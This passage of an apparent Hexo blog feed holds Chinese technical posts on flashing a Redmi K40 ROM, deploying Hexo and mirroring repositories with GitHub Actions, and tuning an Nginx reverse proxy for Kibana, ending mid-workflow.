<p>当我在办公桌前时，可以使用两台 Dell 27 英寸显示器，一个 <a href="https://www.duckychannel.com.tw/page-en/ducky-one/" title="一种机械键盘">Ducky One</a> 机械键盘（樱桃棕色轴）和一个Logitech <a href="https://support.logitech.com/en_us/product/wireless-gaming-mouse-g700" title="一种无线游戏鼠标">G700</a> 鼠标。</p>
<h2 id="您用什么软件"><a href="#您用什么软件" class="headerlink" title="您用什么软件"></a>您用什么软件</h2><p>我只想在台式机上使用 Linux，我的操作系统是<a href="https://www.ubuntu.com/" title="一种 Unix（其实应该是 Linux） 发布">Ubuntu</a>，我的 shell 是 <a href="http://www.zsh.org/" title="一种交互式 shell 和脚本语言">zsh</a>，我用 <a href="https://en.wikipedia.org/wiki/ProtonVPN" title="VPN 提供商">ProtonVPN</a> 连接，我用 <a href="https://www.mozilla.org/en-US/firefox/new/" title="一种跨平台开源的 web 浏览器">Firefox</a> （上网）冲浪，我用 <a href="https://1password.com/" title="Mac OS X 上的一种密码管理软件。">1Password</a> 保存密码，我用 <a href="https://www.spotify.com/us/" title="一种音乐流服务">Spotify</a> 听音乐，我用 <a href="https://toggl.com/" title="一种时间跟踪服务">Toggl</a> 管理时间、用 <a href="https://clubhouse.io/" title="一种项目管理的软件服务">Clubhouse</a> 管理任务，用 <a href="https://www.vim.org/" title="一种命令行文本编辑器">vim</a> 写作，用 <a href="http://www.sublimetext.com/" title="一种程序员的文本编辑器">Sublime Text 3</a> 写代码，使用 <a href="https://zealdocs.org/" title="一种开发者的离线文档阅读器">Zeal</a> 保留我的文档。</p>
<h2 id="您的理想设置是什么"><a href="#您的理想设置是什么" class="headerlink" title="您的理想设置是什么"></a>您的理想设置是什么</h2><p>我对当前设置非常满意，但是我不介意回到带有樱桃蓝色轴的键盘……但是我不想赶走我的伴侣。</p>
]]></content>
      <categories>
        <category>UsesThis</category>
        <category>Engineer</category>
        <category>Developer</category>
        <category>Linux</category>
        <category>Security</category>
      </categories>
  </entry>
  <entry>
    <title>Flash xiaomi.eu for Redmi K40</title>
    <url>/2022/02/flash%20xiaomi.eu%20for%20redmi%20k40/index.html</url>
    <content><![CDATA[<h2 id="envirnment"><a href="#envirnment" class="headerlink" title="envirnment"></a>envirnment</h2><p>首先是环境准备，我用的是 MacOS，这里都是 MacOS 适用。</p>
<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install android-platform-tools</span><br><span class="line"><span class="comment"># brew install android-file-transfer</span></span><br><span class="line">brew install openjdk@11</span><br><span class="line">sudo <span class="built_in">ln</span> -sfn /usr/local/opt/openjdk@11/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk-11.jdk</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=&quot;/usr/local/opt/openjdk@11/bin:$PATH&quot;&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/usr/local/opt/openjdk@11/bin:<span class="variable">$PATH</span>&quot;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="unlook-the-bootloader"><a href="#unlook-the-bootloader" class="headerlink" title="unlook the bootloader"></a>unlook the bootloader</h2><p>官方工具只支持 windows，而我用的是 MacOS，所以我就用了一个叫 <a href="https://github.com/francescotescari/XiaoMiToolV2">XiaoMiToolV2</a> 的东西。因为其 release 的版本过老，需要重新自己编译，具体使用步骤如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/francescotescari/XiaoMiToolV2</span><br><span class="line"><span class="built_in">cd</span> XiaoMiToolV2</span><br><span class="line"><span class="built_in">cp</span> /usr/local/bin/adb res/tools/</span><br><span class="line"><span class="built_in">cp</span> /usr/local/bin/fastboot res/tools/</span><br><span class="line">sudo ./gradlew build</span><br><span class="line">sudo ./gradlew run</span><br></pre></td></tr></table></figure>

<h2 id="flash-rom-via-fastboot"><a href="#flash-rom-via-fastboot" class="headerlink" title="flash rom via fastboot"></a>flash rom via fastboot</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb reboot fastboot</span><br><span class="line"><span class="built_in">mkdir</span> temp</span><br><span class="line"><span class="built_in">cd</span> temp</span><br><span class="line">unzip unzip ../xiaomi.eu_multi_HMK40_POCOF3_V13.0.3.0.SKHCNXM_v13-12-fastboot.zip -d .</span><br><span class="line">./macos_fastboot_first_install_with_data_format.sh</span><br></pre></td></tr></table></figure>

<h2 id="links"><a href="#links" class="headerlink" title="links"></a>links</h2><ul>
<li><a href="https://xiaomi.eu/community/threads/how-to-install-xiaomi-eu-rom-for-redmi-k40-poco-f3-mi-11x.61851/">https://xiaomi.eu/community/threads/how-to-install-xiaomi-eu-rom-for-redmi-k40-poco-f3-mi-11x.61851/</a></li>
</ul>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>xiaomi.eu</tag>
        <tag>adb</tag>
        <tag>Redmi_K40</tag>
        <tag>Poco_F3</tag>
        <tag>fastboot</tag>
        <tag>XiaoMiToolV2</tag>
        <tag>bootloader</tag>
        <tag>unlock</tag>
      </tags>
  </entry>
  <entry>
    <title>How to auto deploy Hexo site to GitHub pages via Github Actions</title>
    <url>/2019/10/hexo-github_action-github_pages/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>业界良心的谷歌云（gcp）让我给玩儿坏了呀，原本这一期还没结束（应该到年底），可我的 300 刀的免费额度一个月前就已经花光了，于是乎，我的服务被停掉了。数据都没能机会拉取下来。</p>
<p>这样的话，给我自己折腾了进二十年的博客一个新的归宿又马上变成了火烧眉毛的事情了，早先其实一直在关注 GitHub Actions，而且也早就有申请，所以就乘着这个机会，把博客源文件、网站（静态内容）全都放在 GitHub（GitHtb Pages 服务） 上吧，同时还顺带用一下 GitHub Actions 来做自动构建、部署。</p>
<span id="more"></span>

<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="本地部署到-GitHub-Pages"><a href="#本地部署到-GitHub-Pages" class="headerlink" title="本地部署到 GitHub Pages"></a>本地部署到 GitHub Pages</h2><p>这一步要达到的目标就是：</p>
<ul>
<li>本地能写文章</li>
<li>并能 deploy 到 GitHub 上去（需要关注 hexo deploy github 这个的配置方法）</li>
<li>[username].github.io 下能访问到</li>
</ul>
<h3 id="GitHub-Pages"><a href="#GitHub-Pages" class="headerlink" title="GitHub Pages"></a>GitHub Pages</h3><ul>
<li>登录 GitHub</li>
<li>新建一个 “Repository name” 叫 [username].github.io 的 repository<ul>
<li>“[username]” 为你 GitHub 的帐号，我的例子中，叫：haw-haw.github.io</li>
<li>权限设置为：Public</li>
</ul>
</li>
</ul>
<h3 id="本地-hexo"><a href="#本地-hexo" class="headerlink" title="本地 hexo"></a>本地 hexo</h3><ul>
<li>本地需要安装配置好 nodejs、hexo、相关 theme，还有一些插件，等等，都要弄好</li>
<li>还要配置好能用 git push 东西到 GitHub 上自己的 repository 里，这步如果不会，请自行去查文档</li>
</ul>
<p>总之，要做到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo -d </span><br></pre></td></tr></table></figure>
<p>能把</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo -g </span><br></pre></td></tr></table></figure>
<p>生成的静态内容部署到 GitHub Pages 上去</p>
<h2 id="准备部署密钥对"><a href="#准备部署密钥对" class="headerlink" title="准备部署密钥对"></a>准备部署密钥对</h2><p>本地上执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C <span class="string">&quot;haw-haw@users.noreply.github.com&quot;</span> -f ~/.ssh/github-actions-deploy;</span><br><span class="line"><span class="comment"># 这里的 &quot;haw-haw&quot; 替换成你自己在 GitHub 上的帐号名</span></span><br><span class="line"><span class="comment"># 执行这个命令以后，本地 ~/.ssh/ 目录下会有两个文件：github-actions-deploy 和 github-actions-deploy.pub</span></span><br><span class="line"><span class="comment"># 分别是用来 deploy 时用的公私钥密钥对。这个在后面会用到</span></span><br></pre></td></tr></table></figure>

<h2 id="源代码私仓-hexo"><a href="#源代码私仓-hexo" class="headerlink" title="源代码私仓 hexo"></a>源代码私仓 hexo</h2><p>在 GitHub 上建一个新的 repository</p>
<ul>
<li>Repository name 任取（这里假设是 hexo）</li>
<li>权限为 Private 的 repository</li>
<li>不要选中 “Initialize this repository with a README”</li>
<li>不要 Add .gitignore</li>
<li>不要 Add a license</li>
</ul>
<h2 id="本地源代码提交到-hexo"><a href="#本地源代码提交到-hexo" class="headerlink" title="本地源代码提交到 hexo"></a>本地源代码提交到 hexo</h2><ul>
<li>克隆空私仓：hexo 到本地</li>
<li>将源文件目录下的内容有选择的添加到私仓 hexo 的本地目录下<ul>
<li>public 目录不要（因为构建时会生成 public 目录下的东西）</li>
<li>node_modules 目录不要（因为在准备构建环境时会自动安装这些需要的模块的）</li>
</ul>
</li>
<li>将准备好的源代码目录内容推送到 hexo 私仓</li>
</ul>
<h2 id="配置好部署密钥对"><a href="#配置好部署密钥对" class="headerlink" title="配置好部署密钥对"></a>配置好部署密钥对</h2><h3 id="私钥到-hexo"><a href="#私钥到-hexo" class="headerlink" title="私钥到 hexo"></a>私钥到 hexo</h3><p>叫 “hexo” 的私仓建好以后，点进去，点击 Settings–&gt;Secrets–&gt;”Add a new secret”</p>
<ul>
<li>在 Name 框里填入：GH_ACTION_DEPLOY_KEY</li>
<li>在 Value 框里填入本地文件 ~&#x2F;.ssh&#x2F;github-actions-deploy 的内容（注意：是文件内容！）</li>
</ul>
<h3 id="公钥到-haw-haw-github-io"><a href="#公钥到-haw-haw-github-io" class="headerlink" title="公钥到 haw-haw.github.io"></a>公钥到 haw-haw.github.io</h3><p>进入名为 “haw-haw.github.io”(用你的用户名来取代 “haw-haw”) 的 Repository</p>
<ul>
<li>点击 Settings–&gt;”Deploy keys”–&gt;”Add deploy key”</li>
<li>Title 随意填</li>
<li>Key 框里填本地文件 ~&#x2F;.ssh&#x2F;github-actions-deploy.pub（注意：带 “.pub”） 的内容</li>
</ul>
<h2 id="GitHub-Actions"><a href="#GitHub-Actions" class="headerlink" title="GitHub Actions"></a>GitHub Actions</h2><p>在 hexo 私仓下新建文件：.github&#x2F;workflows&#x2F;hexo.yml（目录不存在的话自己建），内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Main</span> <span class="string">workflow</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-18.04</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v1</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Use</span> <span class="string">Node.js</span> <span class="number">10.</span><span class="string">x</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="string">&#x27;10.x&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">prepare</span> <span class="string">build</span> <span class="string">env</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="attr">GH_ACTION_DEPLOY_KEY:</span> <span class="string">$&#123;&#123;secrets.GH_ACTION_DEPLOY_KEY&#125;&#125;</span></span><br><span class="line">        <span class="attr">NEXT_VERSION:</span> <span class="string">v7.3.0</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        mkdir -p ~/.ssh/</span></span><br><span class="line"><span class="string">        echo &quot;$GH_ACTION_DEPLOY_KEY&quot; | tr -d &#x27;\r&#x27; &gt; ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">        chmod 600 ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">        ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">        git config --global user.name &#x27;haw-haw&#x27;</span></span><br><span class="line"><span class="string">        git config --global user.email &#x27;haw-haw@users.noreply.github.com&#x27;</span></span><br><span class="line"><span class="string">        npm i -g hexo-cli</span></span><br><span class="line"><span class="string">        npm i</span></span><br><span class="line"><span class="string"></span>    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">deploy</span> <span class="string">to</span> <span class="string">github</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">hexo</span> <span class="string">generate</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure>

<p>以上就是我正在用的配置，其实基本上都是来自于 GitHub 官方的 node 的 workflow 的配置，所以具体也没什么细讲的，这里只提一个点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tr</span> -d <span class="string">&#x27;\r&#x27;</span> &gt; ~/.ssh/id_rsa;</span><br></pre></td></tr></table></figure>

<p>上面这一句，如果是你在部署是碰到 id_rsa 的文件格式错误的问题，那么这一句就是解决这个问题的。</p>
<h1 id="常规使用方法"><a href="#常规使用方法" class="headerlink" title="常规使用方法"></a>常规使用方法</h1><h2 id="本地使用"><a href="#本地使用" class="headerlink" title="本地使用"></a>本地使用</h2><ul>
<li>clone 私仓 hexo 到本地</li>
<li>本地在目录 source&#x2F;_posts&#x2F; 下编辑新的文件</li>
<li>提交到本地</li>
<li>push 到远端（GitHub 私仓 hexo 的 master 分支），触发构建、部署</li>
</ul>
<h2 id="在线使用"><a href="#在线使用" class="headerlink" title="在线使用"></a>在线使用</h2><p>在 web 端进入私仓 hexo 的 master 分支的 source&#x2F;_posts&#x2F; 目录下新建文件并编辑，完成后 commit，触发构建部署（这种方式不推荐，因为也许会太频繁的触发构建）</p>
<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><h2 id="推荐使用方法"><a href="#推荐使用方法" class="headerlink" title="推荐使用方法"></a>推荐使用方法</h2><p>新开一个分支：draft，然后再在这个分支上做操作（修改也好、新建也好），无论是本地，还是在线，都不会触发构建（因为 GitHub Action 只在 master 下才有效），修改新建文章完毕，再 merge 到 master 分支，进而会触发 GitHub Action 自动构建、部署。</p>
<h2 id="定制域名"><a href="#定制域名" class="headerlink" title="定制域名"></a>定制域名</h2><p>如果你在 GitHub Pages 上是使用的自定义域名，而不是像我这样 haw-haw.github.io 的域名（实际上我也是自定义的域名：），那么你需要在 hexo 的 master 分支的 source&#x2F; 放一个叫 CNAME 的文件，里面写上你的自定义域名，比如我的：ming.theyan.gs。否则，每次部署，你的自定义域名配置都会被清掉！</p>
<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><ul>
<li><a href="https://github.com/features/actions">GitHub Actions</a> 目前还是 beta 状态，使用也还需要申请</li>
<li>对于私仓，GitHub Actions 超过每月 2000 分钟的时间是要收费的。<br>  我现在不到 40 篇文章，每次构建一分钟出头，如果按两分钟算，一个月可以构建 1000 次，每天可以构建 33 次，感觉怎么都够了。</li>
</ul>
]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>GitHub Actions</tag>
        <tag>GitHub Pages</tag>
        <tag>nodejs</tag>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>how to tune Nginx acted as reverse proxy for Kibana</title>
    <url>/2019/04/how-to-tune-Nginx-acted-as-reverse-proxy-for-Kibana/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>老套路，公司在用 AWS 上的 Elasticsearch 服务，连带的就有一个 Kibana，按照官方的说法，Kibana 这块的密码保护，可以用 AWS 的 Cognito 服务来做，或者是用前置 Nginx 反向代理的方法来做。</p>
<span id="more"></span>

<p>但是，AWS 大中国区并没有 Cognito 服务，所以，没得选，只能采用在 Kibana 前置 Nginx 反向代理的方法来实现简单权限控制了。</p>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>官方有两篇文章（ <a href="https://aws.amazon.com/premiumsupport/knowledge-center/kibana-outside-vpc-nginx-elasticsearch/">https://aws.amazon.com/premiumsupport/knowledge-center/kibana-outside-vpc-nginx-elasticsearch/</a> 和 <a href="https://docs.aws.amazon.com/en_us/elasticsearch-service/latest/developerguide/es-kibana.html#es-kibana-proxy">https://docs.aws.amazon.com/en_us/elasticsearch-service/latest/developerguide/es-kibana.html#es-kibana-proxy</a> ）涉及到了这种情况下怎么配置 Nginx，于是，我的配置文件的第一版几乎完全来自于这个配置的适当修改。</p>
<h1 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h1><p>最早发现问题是在我司办公室的网络环境下，感觉首先进入的那个页面非常慢，然后，刷新 15 分钟数据偶尔也会感觉有些慢，婶婶可忍叔叔不可忍，于是打开浏览器的各种 develop tools 来看下，发现更新数据是抓的一个 .json 的文件，有四兆多，于是考虑能否在 Nginx 端启用压缩呢？</p>
<h1 id="初步解决"><a href="#初步解决" class="headerlink" title="初步解决"></a>初步解决</h1><p>于是否，就在 Nginx 处打开了 gzip 压缩，当然尤其要在压缩的文件类型中指定上面发现的 .json 文件的 mime 类型：application&#x2F;json。重启 Nginx，再次再刷新数据的时候，发现只传输了几百 K，速度快多了。</p>
<h1 id="进一步解决"><a href="#进一步解决" class="headerlink" title="进一步解决"></a>进一步解决</h1><p>前面有提到，除了刷新数据慢，还有一个首页进入非常慢，接着就要解决这个非常慢的问题。同样用 develope tools 抓包看，发现首页进入的时候需要加载三个非常大的 .js 文件（十几兆的 vendors.bundle.dll.js 以及几兆的 commons.bundle.js 和 kibana.bundle.js），于是乎，在 Nginx 启用压缩的 mime 类型中加入 .js 文件的 mime 类型，重启 Nginx。再次刷新首页，发现秒入。又一个问题解决了。</p>
<h1 id="还可以尝试"><a href="#还可以尝试" class="headerlink" title="还可以尝试"></a>还可以尝试</h1><p>前面看到，导致慢的原因无非是几个大家伙要下载导致的，启用服务器端压缩固然能减少数据传输量来起到优化用户体验的目的，但是，如果我们启用缓存是不是更能起到优化的效果呢？要知道， .js 可很有可能是静态文件，非常适用于缓存。</p>
<p>但是这一步我最终没有这样去做，原因有三：</p>
<ul>
<li>我并不能百分百保证这三个 .js 文件不是动态生成的（毕竟现在有很多“伪静态”的东西）</li>
<li>我并没有更多的时间</li>
<li>目前的效果已经到了可以接受的程度了</li>
</ul>
<p>所以这一步就留到以后有时间的时候研究吧</p>
<h1 id="附上-Nginx-配置"><a href="#附上-Nginx-配置" class="headerlink" title="附上 Nginx 配置"></a>附上 Nginx 配置</h1><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">add_header</span>	Proxy_Server	<span class="variable">$hostname</span>	always;</span><br><span class="line">    <span class="attribute">server_name</span>  kibana.xxxxxx.com;</span><br><span class="line">    <span class="attribute">root</span>         /usr/share/nginx/html;</span><br><span class="line">    <span class="attribute">client_header_buffer_size</span> <span class="number">64k</span>;</span><br><span class="line">    <span class="attribute">large_client_header_buffers</span> <span class="number">4</span> <span class="number">64k</span>;</span><br><span class="line">    <span class="attribute">satisfy</span> any;</span><br><span class="line">    <span class="attribute">allow</span> <span class="number">127.0.0.0</span>/<span class="number">8</span>;</span><br><span class="line">    <span class="attribute">allow</span> <span class="number">172.16.0.0</span>/<span class="number">12</span>;</span><br><span class="line">    <span class="attribute">allow</span> <span class="number">192.168.0.0</span>/<span class="number">16</span>;</span><br><span class="line">    <span class="attribute">deny</span>  all;</span><br><span class="line">    <span class="attribute">auth_basic</span>  <span class="string">&quot;Kibana Auth&quot;</span>;</span><br><span class="line">    <span class="attribute">auth_basic_user_file</span> /etc/nginx/.pasd_kibana;</span><br><span class="line">    <span class="attribute">resolver</span> <span class="number">10.1.1.2</span>;</span><br><span class="line">  <span class="comment"># Fix nginx resolving url only on config load (AWS can change the endpoint IP at anytime)</span></span><br><span class="line">  <span class="comment"># by using a variable, it forces nginx to resolve the resolver above.</span></span><br><span class="line">    <span class="attribute">gzip</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">gzip_buffers</span>        <span class="number">16</span> <span class="number">8k</span>;</span><br><span class="line">    <span class="attribute">gzip_comp_level</span>     <span class="number">4</span>;</span><br><span class="line">    <span class="attribute">gzip_http_version</span>   <span class="number">1</span>.<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">gzip_min_length</span>     <span class="number">1280</span>;</span><br><span class="line">    <span class="attribute">gzip_types</span>          text/plain text/css text/xml application/x-javascript application/xml application/xml+rss application/json application/javascript text/*;</span><br><span class="line">    <span class="attribute">gzip_vary</span>           <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$proxy_pass_url</span> vpc-xxxxxxxxxxxx-xxxxxxxxxxxxxxxxxx.cn-northwest-<span class="number">1</span>.es.amazonaws.com.cn;</span><br><span class="line">    <span class="section">location</span> = / &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> /_plugin/kibana/;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="section">location</span> /_plugin/kibana/ &#123;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Connection <span class="string">&quot;Keep-Alive&quot;</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Proxy-Connection <span class="string">&quot;Keep-Alive&quot;</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Authorization <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="attribute">proxy_pass_request_headers</span>      <span class="literal">off</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> kbn-xsrf <span class="string">&quot;kibana&quot;</span>;</span><br><span class="line">        <span class="attribute">proxy_hide_header</span> content-security-policy;</span><br><span class="line">        <span class="attribute">proxy_pass</span> https://<span class="variable">$proxy_pass_url</span>;</span><br><span class="line">        <span class="attribute">proxy_buffer_size</span> <span class="number">128k</span>;</span><br><span class="line">        <span class="attribute">proxy_buffers</span> <span class="number">4</span> <span class="number">256k</span>;</span><br><span class="line">        <span class="attribute">proxy_busy_buffers_size</span> <span class="number">256k</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>AWS</tag>
        <tag>Elasticsearch</tag>
        <tag>Kibana</tag>
      </tags>
  </entry>
  <entry>
    <title>support alibaba cloud in draw.io</title>
    <url>/2020/11/support%20alibaba%20cloud%20in%20draw.io/index.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近几年一直在用 draw.io 来画一些工作中的架构图之类的各种图，这个工具对于 AWS、azure 甚至于 GCP 都支持，但惟独就是还不支持阿里云，而工作中有几家公司偏偏就是用的阿里云，其实也可以用 AWS 之类的图标来画，但强迫症让我必须用阿里云自己的图标。于是就有了本篇内容。</p>
<span id="more"></span>

<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>先把成果发出来，地址在<a href="https://github.com/haw-haw/image-hosting/raw/master/resource/cloud_aliyun.xml.gz">这里</a></p>
<p>把这个下载下来，解压到某一个特定的地方，然后在 draw.io 里将解压出来的文件 import 进去就可以了。</p>
<p>注意：解压出来的文件可不能被删除或移动。</p>
]]></content>
      <tags>
        <tag>draw.io</tag>
        <tag>阿里云</tag>
        <tag>alibaba cloud</tag>
        <tag>aliyun</tag>
      </tags>
  </entry>
  <entry>
    <title>sync repo from Github to Gitee using github action</title>
    <url>/2021/12/sync_repo_from_github_to_gitee_using_github_action/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>早年在 github 上做了个 repo 用作图床，但是由于种种原因，大陆访问 github.com 的速度感人，故而想把（图床）数据在大陆的 gitee.com 上也同步一份，然后用 gitee.com 上的图床来给大家访问。</p>
<span id="more"></span>

<p>网上搜了下，有用 gitee 的“镜像仓库”的功能的，但这个功能需要申请开通，直接否掉。然后其他基本都是用 github action 来实现，这个我也是认同的。不过好多人都是直接用的别人做好的项目来实现的，由于我一是觉得这个东西不复杂没必要用别人封装好的东西（因为他封装好的好些东西我不一定需要），再个感觉虽然别人也开源但我也没那闲功夫整天 review 别人的代码，所以我就想不用别人现成的东西，自己整。</p>
<h2 id="具体方案"><a href="#具体方案" class="headerlink" title="具体方案"></a>具体方案</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h4 id="公私钥一对"><a href="#公私钥一对" class="headerlink" title="公私钥一对"></a>公私钥一对</h4><p>没有的话可以生成：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -f id_ed25519_github2gitee -C <span class="string">&quot;for sync from github to gitee&quot;</span>;</span><br><span class="line"><span class="comment"># 按两次回车键以输入空的 passphrase</span></span><br><span class="line"><span class="comment"># 私钥在 id_ed25519_github2gitee 里</span></span><br><span class="line"><span class="comment"># 公钥在 id_ed25519_github2gitee.pub 里</span></span><br></pre></td></tr></table></figure>

<h4 id="github-账号及图床仓库"><a href="#github-账号及图床仓库" class="headerlink" title="github 账号及图床仓库"></a>github 账号及图床仓库</h4><p>这里假设是 xxxxgithub 和 imagehostgithub</p>
<h3 id="gitee-测"><a href="#gitee-测" class="headerlink" title="gitee 测"></a>gitee 测</h3><ul>
<li>新建账号（假设是：xxxxgitee）</li>
<li>新建仓库（假设是：imagehostgitee）</li>
<li>上传公钥（<a href="https://gitee.com/profile/sshkeys%EF%BC%89">https://gitee.com/profile/sshkeys）</a></li>
</ul>
<h3 id="github-测"><a href="#github-测" class="headerlink" title="github 测"></a>github 测</h3><h4 id="上传私钥"><a href="#上传私钥" class="headerlink" title="上传私钥"></a>上传私钥</h4><p>在 Settings-&gt;Secrets 配置一个叫 GITEE_PRIVATE_KEY 的 Repository secrets，内容就是前面准备的私钥（文件 id_ed25519_github2gitee 里）</p>
<h4 id="配置-github-action"><a href="#配置-github-action" class="headerlink" title="配置 github action"></a>配置 github action</h4><p>新建文件 .github&#x2F;workflows&#x2F;sync2gitee.yml，内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">sync2gitee</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">repo-sync:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">persist-credentials:</span> <span class="literal">false</span></span><br><span class="line">      </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">sync</span> <span class="string">github</span> <span class="string">-&gt;</span> <span class="string">gitee</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">SSH_KEY:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITEE_PRIVATE_KEY</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">GITHUB_REPO:</span> <span class="string">&quot;https://github.com/xxxxgithub/imagehostgithub.git&quot;</span></span><br><span class="line">          <span class="attr">GITEE_REPO:</span> <span class="string">&quot;git@gitee.com:xxxxgitee/imagehostgitee.git&quot;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          mkdir -p ~/.ssh/</span></span><br><span class="line"><span class="string">          echo &quot;$SSH_KEY&quot; | tr -d &#x27;\r&#x27; &gt; ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          chmod 600 ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">          ssh-keyscan gitee.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;xxxxgitee&quot;</span></span><br><span class="line"><span class="string"></span>          </span><br><span class="line">          <span class="string">git</span> <span class="string">clone</span> <span class="string">--mirror</span> <span class="string">&quot;$GITHUB_REPO&quot;</span> <span class="string">&amp;&amp;</span> <span class="string">cd</span> <span class="string">`basename</span> <span class="string">&quot;$GITHUB_REPO&quot;</span><span class="string">`</span></span><br><span class="line">          <span class="string">git</span> <span class="string">remote</span> <span class="string">set-url</span> <span class="string">--push</span> <span class="string">origin</span> <span class="string">&quot;$GITEE_REPO&quot;</span></span><br><span class="line">          <span class="string">git</span> <span class="string">fetch</span> <span class="string">-p</span> <span class="string">origin</span></span><br><span class="line">          <span class="string">git</span> <span class="string">for-each-ref</span> <span class="string">--format</span> <span class="string">&#x27;delete %(refname)&#x27;</span> <span class="string">refs/pull</span> <span class="string">|</span> <span 